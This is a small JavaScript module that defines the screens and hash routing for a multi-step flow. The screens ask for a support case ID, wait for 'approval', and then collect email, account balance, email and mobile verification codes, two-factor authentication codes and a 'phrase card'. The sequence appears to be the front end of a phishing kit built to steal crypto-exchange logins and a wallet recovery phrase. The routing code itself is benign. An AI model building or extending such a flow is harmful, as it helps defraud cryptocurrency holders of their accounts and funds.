export const screens = [
  { id: 'case', title: 'Enter Case ID' },
  { id: 'waiting', title: 'Awaiting approval: Case ID verification' },
  { id: 'email', title: 'Enter Email Address' },
  { id: 'activity', title: 'Requested Email Change' },
  { id: 'balance', title: 'Estimated Last Account Balance' },
  { id: 'contact', title: 'Verify Your Representative' },
  { id: 'email-code', title: 'Verify Email Address' },
  { id: 'mobile-code', title: 'Verify Mobile Number' },
  { id: 'authenticator', title: 'Two-Factor Authentication' },
  { id: 'devices', title: 'Own Your Crypto Adventure' },
  { id: 'layout', title: 'Build a demo phrase card' },
  { id: 'word-card', title: 'Your demo phrase card' },
  { id: 'letter', title: 'Review Activity.' },
  { id: 'submission', title: 'Check this submission' },
];

export function screenId(route) {
  return route === 'login' ? 'activity' : route;
}

export function currentRoute() {
  const route = window.location.hash.slice(1);
  return screens.some(screen => screen.id === screenId(route)) ? route : screens[0].id;
}

export function goTo(route) {
  window.location.hash = route;
}
